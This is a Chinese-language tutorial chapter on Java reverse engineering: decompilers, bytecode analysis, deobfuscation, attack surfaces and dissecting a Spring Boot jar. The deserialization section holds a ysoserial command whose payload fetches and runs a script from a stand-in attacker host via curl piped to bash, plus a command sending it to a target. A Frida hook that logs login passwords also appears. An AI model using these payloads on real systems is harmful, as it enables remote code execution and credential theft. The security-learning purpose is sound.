# Java 逆向工程与安全分析

> Java 字节码的中间表示层使其成为逆向工程的热门目标。本章覆盖 Java 反编译、字节码分析、
> 混淆绕过、漏洞挖掘等技术，帮助安全研究者理解 Java 应用的内部逻辑，找到攻击面。

> **前置知识**：建议先完成 [[../../java/1入门/00_Java是什么|Java 入门教程]] 和 [[../../java/2深入/06_JVM内存模型|JVM 内存模型]]，
> 理解 Java 类加载、字节码执行机制后再学习本章。

---

## 一、Java 逆向工程概述

### 1.1 为什么 Java 容易逆向

```
Java 源码 → 编译 → 字节码(.class) → JVM 执行
                  ↑
            中间表示层
         (比机器码容易理解得多)
```

| 特性 | 说明 |
|------|------|
| 字节码结构 | 类名、方法名、字段名、常量池全部保留 |
| 反编译质量 | 高质量反编译器可还原 90%+ 源码 |
| 反射机制 | 运行时可获取任意类的信息 |
| 动态代理 | 运行时生成代理类，可被拦截 |

### 1.2 Java vs C/C++ 逆向对比

| 维度 | Java | C/C++ |
|------|------|-------|
| 二进制表示 | 字节码（结构化） | 机器码（无结构） |
| 反编译难度 | 低（工具成熟） | 高（需人工分析） |
| 符号保留 | 类名/方法名保留 | 需符号表 |
| 混淆效果 | 中等（可部分还原） | 高（难以还原） |
| 调试信息 | 容易保留 | 需要 DWARF/PDB |

---

## 二、反编译工具

### 2.1 CFR（推荐，免费）

```bash
# 下载 CFR
wget https://www.benf.org/other/cfr/cfr-0.152.jar

# 反编译单个 class 文件
java -jar cfr-0.152.jar MyClass.class

# 反编译整个 jar 包
java -jar cfr-0.152.jar application.jar --outputdir ./decompiled

# 反编译并显示所有代码（包括私有方法）
java -jar cfr-0.152.jar MyClass.class --showinherited

# 还原 Lambda 表达式
java -jar cfr-0.152.jar MyClass.class --decodelambdas true
```

### 2.2 Procyon（推荐，开源）

```bash
# 下载 Procyon
wget https://github.com/mstrobel/procyon/releases/download/v0.6.0/procyon-decompiler-0.6.0.jar

# 反编译
java -jar procyon-decompiler-0.6.0.jar MyClass.class -o ./output

# 反编译 jar
java -jar procyon-decompiler-0.6.0.jar application.jar -o ./output
```

### 2.3 JD-GUI（图形界面）

```bash
# 下载 JD-GUI
# https://github.com/java-decompiler/jd-gui/releases

# 启动图形界面
java -jar jd-gui-1.6.6.jar

# 直接打开 class 文件或 jar 包
```

### 2.4 Fernflower（IntelliJ 内置）

```bash
# IntelliJ IDEA 内置反编译器
# 右键 class 文件 → Decompile

# 命令行使用
java -jar fernflower.jar MyClass.class ./output/
```

### 2.5 反编译器对比

| 工具 | 类型 | Lambda 还原 | 混淆处理 | 推荐场景 |
|------|------|------------|---------|---------|
| CFR | 免费 | 好 | 一般 | 日常分析 |
| Procyon | 开源 | 好 | 好 | 复杂代码 |
| JD-GUI | 免费 | 一般 | 一般 | 快速查看 |
| Fernflower | 免费 | 好 | 好 | IntelliJ 用户 |
| Jadx | 开源 | 好 | 好 | Android/多格式 |

---

## 三、字节码分析

### 3.1 使用 javap 查看字节码

```bash
# 查看类的基本信息
javap -verbose MyClass.class

# 只看方法签名
javap -public MyClass.class

# 查看完整字节码指令
javap -c -p MyClass.class
```

### 3.2 字节码指令示例

```java
// Java 源码
public int add(int a, int b) {
    return a + b;
}
```

```text
// javap -c 输出
public int add(int, int);
  Code:
    0: iload_1        // 将第一个参数(a)压入栈
    1: iload_2        // 将第二个参数(b)压入栈
    2: iadd           // 栈顶两个值相加
    3: ireturn        // 返回结果
```

### 3.3 常用字节码指令

| 指令 | 说明 | 对应 Java |
|------|------|----------|
| `iload` / `aload` | 加载局部变量 | 局部变量引用 |
| `istore` / `astore` | 存储到局部变量 | 赋值 |
| `iadd` / `isub` | 整数加减 | `+` / `-` |
| `imul` / `idiv` | 整数乘除 | `*` / `/` |
| `invokevirtual` | 调用虚方法 | 方法调用 |
| `invokeinterface` | 调用接口方法 | 接口调用 |
| `invokespecial` | 调用构造器/私有方法 | `new` / `super` |
| `invokestatic` | 调用静态方法 | 静态方法调用 |
| `getfield` / `putfield` | 访问字段 | 对象字段读写 |
| `new` | 创建对象 | `new MyClass()` |
| `athrow` | 抛出异常 | `throw` |

### 3.4 使用 ASM 分析字节码

```java
import org.objectweb.asm.*;

public class BytecodeAnalyzer {
    public static void main(String[] args) throws Exception {
        ClassReader cr = new ClassReader("MyClass");
        ClassVisitor cv = new ClassVisitor(Opcodes.ASM9) {
            @Override
            public MethodVisitor visitMethod(int access, String name, 
                    String descriptor, String signature, String[] exceptions) {
                System.out.println("方法: " + name + descriptor);
                return new MethodVisitor(Opcodes.ASM9) {
                    @Override
                    public void visitCode() {
                        System.out.println("  开始字节码");
                    }
                    @Override
                    public void visitInsn(int opcode) {
                        System.out.println("  指令: " + opcode);
                    }
                };
            }
        };
        cr.accept(cv, 0);
    }
}
```

---

## 四、混淆与反混淆

### 4.1 常见混淆工具

| 工具 | 类型 | 混淆方式 |
|------|------|---------|
| ProGuard | 开源 | 名称混淆 + 优化 + 压缩 |
| Allatori | 商业 | 名称混淆 + 控制流混淆 |
| Zelix KlassMaster | 商业 | 字符串加密 + 名称混淆 |
| DashO | 商业 | 多层混淆 + 反调试 |

### 4.2 混淆后的特征

```text
# 混淆前
com.example.service.UserService.login(String, String)

# 混淆后
a.b.c.a.a(String, String)

# 特征：
# 1. 类名/方法名变成 a, b, c 等短名称
# 2. 包名变成单字母
# 3. 字符串常量被加密
# 4. 控制流被打乱（if 嵌套、死代码）
```

### 4.3 反混淆策略

```bash
# 1. 使用名映射文件（如果混淆器导出了 mapping）
# ProGuard mapping.txt
# org.example.UserService -> a.b.c.a

# 2. 使用 Enigma（开源反混淆工具）
# https://github.com/CaffeineMC/enigma

# 3. 手动分析 + 动态调试
# 结合 Frida 或 JDB 在运行时观察实际执行路径
```

---

## 五、Java 应用安全分析

### 5.1 常见攻击面

| 攻击面 | 说明 | 工具 |
|--------|------|------|
| 反序列化漏洞 | ObjectInputStream 读取恶意对象 | ysoserial |
| JNDI 注入 | RMI/LDAP 远程类加载 | JNDIExploit |
| EL 表达式注入 | 模板引擎执行任意代码 | SpELProbe |
| XML 外部实体 | XXE 攻击 | XXEtest |
| 表达式语言注入 | OGNL/SpEL/UEL | OgnlShell |
| 日志注入 | 日志中插入恶意内容 | LogInject |

### 5.2 使用 ysoserial 生成反序列化 Payload

```bash
# 下载 ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# 生成 CommonsCollections payload
java -jar ysoserial-all.jar CommonsCollections1 "curl http://attacker.com/shell.sh | bash" > payload.bin

# 使用工具发送 payload
java -jar ysoserial-all.jar CommonsCollections1 "id" | curl -X POST --data-binary @- http://target:8080/deserialize
```

### 5.3 使用 Frida Hook Java 方法

```javascript
// frida -U -l hook.js com.example.app

Java.perform(function() {
    // Hook 所有 login 方法
    var UserService = Java.use("com.example.service.UserService");
    UserService.login.implementation = function(username, password) {
        console.log("[!] login called: " + username + " / " + password);
        return this.login(username, password);
    };
    
    // Hook System.exit
    var System = Java.use("java.lang.System");
    System.exit.implementation = function(code) {
        console.log("[!] System.exit(" + code + ") blocked");
        // 不调用原始方法，阻止退出
    };
});
```

### 5.4 使用 JDB 调试 Java 应用

```bash
# 远程调试（应用启动时添加参数）
java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 -jar app.jar

# 连接调试器
jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=5005

# 设置断点
> stop in com.example.service.UserService.login
> run

# 查看变量
> print username
> dump user

# 修改变量
> eval password = "bypass"
```

---

## 六、实战：分析一个 Spring Boot 应用

### 6.1 获取目标

```bash
# 下载 Spring Boot jar
wget http://target:8080/app.jar

# 查看 jar 结构
jar -tf app.jar | head -20
# META-INF/
# META-INF/MANIFEST.MF
# org/springframework/boot/loader/JarLauncher.class
# BOOT-INF/classes/
# BOOT-INF/classes/com/example/Application.class
# BOOT-INF/lib/
```

### 6.2 提取并反编译

```bash
# 提取 BOOT-INF/classes 下的代码
jar -xf app.jar BOOT-INF/classes/
cd BOOT-INF/classes/

# 反编译所有 class 文件
java -jar cfr-0.152.jar com/example/Application.class --outputdir ./decompiled

# 或反编译整个 jar
java -jar cfr-0.152.jar ../../app.jar --outputdir ./decompiled
```

### 6.3 分析安全配置

```bash
# 查找配置文件
find ./decompiled -name "*.yml" -o -name "*.properties"

# 反编译后搜索敏感信息
grep -r "password" ./decompiled/
grep -r "secret" ./decompiled/
grep -r "apikey" ./decompiled/
```

### 6.4 分析认证逻辑

```bash
# 搜索认证相关类
grep -r "Authentication" ./decompiled/
grep -r "SecurityConfig" ./decompiled/
grep -r "@PreAuthorize" ./decompiled/

# 查找硬编码密码
grep -r " BCrypt\|MD5\|SHA" ./decompiled/
```

---

## 七、Java 逆向常用工具速查

| 工具 | 用途 | 链接 |
|------|------|------|
| CFR | 反编译器 | https://www.benf.org/other/cfr/ |
| Procyon | 反编译器 | https://github.com/mstrobel/procyon |
| JD-GUI | 图形反编译器 | https://github.com/java-decompiler/jd-gui |
| Jadx | Android/Java 反编译 | https://github.com/skylot/jadx |
| javap | JDK 字节码查看 | JDK 内置 |
| ASM | 字节码操作库 | https://asm.ow2.io/ |
| Bytecode Viewer | 多反编译器集成 | https://github.com/Col-E/BytecodeViewer |
| Enigma | 反混淆 | https://github.com/CaffeineMC/enigma |
| ysoserial | 反序列化 Payload | https://github.com/frohoff/ysoserial |
| Frida | 动态 Hook | https://frida.re/ |
| JDB | Java 调试器 | JDK 内置 |
| Arthas | 在线诊断 | https://github.com/alibaba/arthas |

---

## 八、与 Java 主教程的关联

| 本章主题 | Java 主教程章节 |
|---------|----------------|
| JVM 内存模型 | [[../../java/2深入/06_JVM内存模型]] |
| 类加载机制 | [[../../java/2深入/02_注解与反射]] |
| 字节码基础 | [[../../java/2深入/06_JVM内存模型]] |
| 反射机制 | [[../../java/2深入/02_注解与反射]] |
| Spring 原理 | [[../../java/3工程化/05_Spring IoC与AOP]] |
| 序列化机制 | [[../../java/1入门/17_文件IO]] |
| 安全框架 | [[../../java/3工程化/09_Spring Security]] |

> **学习建议**：先完成 Java 主教程的入门和深入部分，理解 JVM 工作原理后再学习逆向工程。
> 逆向分析的本质是"从结果推原因"——你需要先知道正常代码是什么样子，才能识别异常。
